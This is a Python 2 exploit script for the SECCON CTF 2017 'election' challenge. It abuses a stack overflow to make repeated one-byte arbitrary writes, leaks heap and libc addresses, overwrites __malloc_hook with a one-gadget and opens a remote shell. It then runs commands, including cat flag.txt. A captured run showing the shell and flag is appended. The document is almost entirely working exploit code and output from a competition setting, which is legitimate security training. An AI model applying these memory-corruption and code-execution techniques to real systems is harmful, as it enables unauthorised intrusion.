#!/usr/bin/env python2
# --------------------------------------------------------------------------------------------------
# SECCON CTF 2017 - election (pwn 200)
# --------------------------------------------------------------------------------------------------
import socket
import struct
import telnetlib
import string

# --------------------------------------------------------------------------------------------------
def recv_until(st):                                 # receive until you encounter a string
    ret = ""

    while st not in ret:
        recv = s.recv(8192)
        ret += recv

        if not len(recv):
            print 'Timeout :('
            exit()

    return ret


# --------------------------------------------------------------------------------------------------
def stand(name, final=False):
    s.sendall('1' + '\n')
    recv_until(">>")

    s.sendall(name + '\n')
    if not final: recv_until(">>")


# --------------------------------------------------------------------------------------------------
def vote(show, name, ovfl=''):
    s.sendall('2' + '\n')
    recv_until("Show candidates? (Y/n)")

    s.sendall(show + '\n')                          # 'y' or 'n'
    r = recv_until(">>")                            # if 'y' collect response

    s.sendall(name + '\n')
    recv_until(">>")

    if name == 'oshima':                            # when name is 'oshima', overflow
        s.sendall(ovfl + '\n')
        recv_until(">>")

    return r                                        # return candidates


# --------------------------------------------------------------------------------------------------
def extract(resp):                                  # extract an address from a response
    off  = resp.rfind('* ') + 2                     # get last candidate
    leak = struct.unpack("<Q", resp[off:off+8])[0]  # unpack it

    leak &= 0x0000ffffffffffff                      # each address is 48-bits

    # right after number there will be a new line. drop it
    if leak & 0xff000000 == 0x0a000000:
        return leak & 0xffffff

    elif leak & 0xff00000000 == 0x0a00000000:
        return leak & 0xffffffff

    elif leak & 0xff0000000000 == 0x0a0000000000:
        return leak & 0xffffffffff


    if leak & 0xff     == 0x0a   or \
       leak & 0xff00   == 0x0a00 or \
       leak & 0xff0000 == 0x0a0000:
            print '[!] Address 0x%x contains a newline. Abort :(' % leak
            exit()

    return leak


# --------------------------------------------------------------------------------------------------
# Given an value, find the 1-byte writes that shoud be done to write that value to memory (prev is
# the existing value on this cell).
def prepare(value, prev=0):
    P = [ord(b) for b in struct.pack("<Q", prev)]
    Z = []

    for val, idx in [(ord(b),i) for b, i in zip(struct.pack("<Q", value), range(8))]:
        if val >= P[idx]:
            val -= P[idx]

            if val == 0: continue

            if val == 255:
                Z.append( (127, idx))
                Z.append( (127, idx))
                Z.append( (1, idx))

            elif val > 127:
                Z.append( (127, idx))
                Z.append( (val - 127, idx))

            else:
                Z.append( (val, idx) )
        else:
            val = P[idx] - val

            if val < 127:
                Z.append( (256-val, idx))

            else:
                Z.append( (128, idx))
                Z.append( (384 - val, idx) )

    return Z


# --------------------------------------------------------------------------------------------------
if __name__ == "__main__":
    s = socket.create_connection(('election.pwn.seccon.jp', 28349))
    # s = socket.create_connection(('localhost', 7777))

    recv_until(">>")                                # eat banner

    # -------------------------------------------------------------------------
    # Inside vote(), there's a 0x20 byte buffer used to process input. However,
    # the name is 'oshima', program ask for verification and reads 0x30 bytes,
    # thus allowing us to overwrite an arbitrary pointer and an "increment" value:
    #
    # .text:0000000000400B58     mov     edi, offset aIMNotOshimaBut ; "I'm not 'Oshima', but"...
    # .text:0000000000400B5D     mov     eax, 0
    # .text:0000000000400B62     call    printf
    # .text:0000000000400B67     lea     rax, [rbp+s1]
    # .text:0000000000400B6B     mov     esi, 30h                    ; overflow!
    # .text:0000000000400B70     mov     rdi, rax
    # .text:0000000000400B73     call    getnline
    # .text:0000000000400B78     lea     rax, [rbp+s1]
    # .text:0000000000400B7C     mov     esi, offset aYes            ; "yes"
    # .text:0000000000400B81     mov     rdi, rax                    ; s1
    # .text:0000000000400B84     call    strcasecmp
    # .text:0000000000400B89     test    eax, eax
    # .text:0000000000400B8B     jnz     short loc_400C00
    # .text:0000000000400B8D     mov     rax, [rbp+var_20]
    # .text:0000000000400B91     mov     rdx, [rbp+var_20]
    # .text:0000000000400B95     mov     ecx, [rdx+10h]
    # .text:0000000000400B98     movzx   edx, [rbp+var_18]
    # .text:0000000000400B9C     movsx   edx, dl
    # .text:0000000000400B9F     add     edx, ecx
    # .text:0000000000400BA1     mov     [rax+10h], edx               ; arbitrary write!
    # .text:0000000000400BA4     jmp     short loc_400C00
    #
    #
    # First overwrite the LSByte and make name pointer in the list to point to
    # another heap pointer
    # -------------------------------------------------------------------------
    for i in range(0x20):
        print i
        vote('n', 'oshima', 'yes\x00' + 'a'*12 + 'b'*15)

    # -------------------------------------------------------------------------
    # leak a heap address
    # -------------------------------------------------------------------------
    leak = vote('y', 'foo')
    leak = extract(leak)

    heap_base = leak - 0x60
    heap_ptr  = leak - 0x20

    print '[+] Leaking a heap address:', hex(leak)
    print '[+] Heap base address:', hex(heap_base)
    print '[+] Heap pointer (original):', hex(heap_ptr)

    # -------------------------------------------------------------------------
    # modify heap pointer and make it point to .bss.strdup (0x601ff0)
    # -------------------------------------------------------------------------
    print '[+] Base pointer -> .got.strdup ...'

    for val, idx in prepare(0x601ff0, heap_ptr):
        print '0x%x (0x%x[%d]) = 0x%02x' % (heap_base + idx - 0x10, heap_base, idx, val)

        ovfl  = 'yes\x00' + 'A'*4 + 'B'*24
        ovfl += struct.pack("<Q", heap_base + idx - 0x10)
        ovfl += struct.pack("<B", val)

        vote('n', 'oshima', ovfl)


    # -------------------------------------------------------------------------
    # Now name pointer points to .got.strdup
    # -------------------------------------------------------------------------
    print '[+] Leaking a libc address ...'

    leak   = vote('y', 'foo')
    strdup = extract(leak)

    print '[+] Address of strdup():', hex(strdup)


    # -------------------------------------------------------------------------
    # Calculate other libc address
    #   Local:
    #       strdup       : 0x88b30
    #       __malloc_hook: 0x3c2740
    #       one gadget   : 0xe93e5
    #
    #   Remote:
    #       strdup       : 0x8b470
    #       __malloc_hook: 0x3c4b10
    #       one gadget   : 0xf0274
    #
    # -------------------------------------------------------------------------
    # __malloc_hook = strdup - 0x88b30 + 0x3c2740
    # one_gadget = strdup - 0x88b30 + 0xe93e5

    __malloc_hook = strdup - 0x8b470 + 0x3c4b10
    one_gadget = strdup - 0x8b470 + 0xf0274

    print '[+] Address of __malloc_hook():', hex(__malloc_hook)
    print '[+] Address of "one gadget":', hex(one_gadget)


    # -------------------------------------------------------------------------
    # Overwrite __malloc_hook with &one_gadget
    # -------------------------------------------------------------------------
    print '[+] __malloc_hook() -> one_gadget ...'

    for val, idx in prepare(one_gadget):
        print '0x%x (0x%x[%d]) = 0x%02x' % (__malloc_hook + idx - 0x10, __malloc_hook, idx, val)

        ovfl  = 'yes\x00' + 'A'*4 + 'B'*24
        ovfl += struct.pack("<Q", __malloc_hook + idx - 0x10)
        ovfl += struct.pack("<B", val)

        vote('n', 'oshima', ovfl)


    # -------------------------------------------------------------------------
    # Set lv to 1 to allow stand() to be invoked again
    # -------------------------------------------------------------------------
    print '[+] Setting lv = 1 ...'

    ovfl  = 'yes\x00' + 'A'*4 + 'B'*24
    ovfl += struct.pack("<Q", 0x602010 - 0x10)
    ovfl += struct.pack("<B", 0xff)

    vote('n', 'oshima', ovfl)

    # -------------------------------------------------------------------------
    # stand() and trigger malloc() and trigger __malloc_hook()
    # -------------------------------------------------------------------------
    print '[+] Triggering __malloc_hook() ...'
    stand('foo', final=True)        # trigger


    # -------------------------------------------------------------------------
    # Because connection lasts for 60 seconds, send commands immediately
    # -------------------------------------------------------------------------
    s.send('id'     + '\n')
    s.send('date'   + '\n')
    s.send('ls -la' + '\n')
    s.send('cat flag.txt' + '\n')


    print '[+] Opening Shell...'
    t = telnetlib.Telnet()                          # try to open shell
    t.sock = s
    t.interact()

# --------------------------------------------------------------------------------------------------
'''
ispo@nogirl:~/ctf/2017/seccon_ctf/election$ time ./election_expl.py
    [+] Leaking a heap address: 0xdba070
    [+] Heap base address: 0xdba010
    [+] Heap pointer (original): 0xdba050
    [+] Base pointer -> .got.strdup ...
    0xdba000 (0xdba010[0]) = 0x7f
    0xdba000 (0xdba010[0]) = 0x21
    0xdba001 (0xdba010[1]) = 0x80
    0xdba001 (0xdba010[1]) = 0xff
    0xdba002 (0xdba010[2]) = 0x85
    [+] Leaking a libc address ...
    [+] Address of strdup(): 0x7f2dc9035470
    [+] Address of __malloc_hook(): 0x7f2dc936eb10
    [+] Address of "one gadget": 0x7f2dc909a274
    [+] __malloc_hook() -> one_gadget ...
    0x7f2dc936eb00 (0x7f2dc936eb10[0]) = 0x74
    0x7f2dc936eb01 (0x7f2dc936eb10[1]) = 0x7f
    0x7f2dc936eb01 (0x7f2dc936eb10[1]) = 0x23
    0x7f2dc936eb02 (0x7f2dc936eb10[2]) = 0x09
    0x7f2dc936eb03 (0x7f2dc936eb10[3]) = 0x7f
    0x7f2dc936eb03 (0x7f2dc936eb10[3]) = 0x4a
    0x7f2dc936eb04 (0x7f2dc936eb10[4]) = 0x2d
    0x7f2dc936eb05 (0x7f2dc936eb10[5]) = 0x7f
    [+] Setting lv = 1 ...
    [+] Triggering __malloc_hook() ...
    [+] Opening Shell...
        uid=20428 gid=20000(election) groups=20000(election)
    
        Sun Dec 10 13:22:40 JST 2017
    
        total 40
        drwxr-x--- 2 root election  4096 Nov 23 17:17 .
        drwxr-xr-x 6 root root      4096 Nov 28 18:36 ..
        -rw-r----- 1 root election   220 Sep  1  2015 .bash_logout
        -rw-r----- 1 root election  3771 Sep  1  2015 .bashrc
        -rw-r----- 1 root election   655 May 16  2017 .profile
        -rwxr-x--- 1 root election 13432 Nov 23 17:17 election
        -rw-r----- 1 root election    34 Nov 23 16:04 flag.txt
    
        SECCON{I5_7h15_4_fr4ud_3l3c710n?}
    *** Connection closed by remote host ***

    real    1m0.564s
    user    0m0.048s
    sys     0m0.028s
'''
# --------------------------------------------------------------------------------------------------
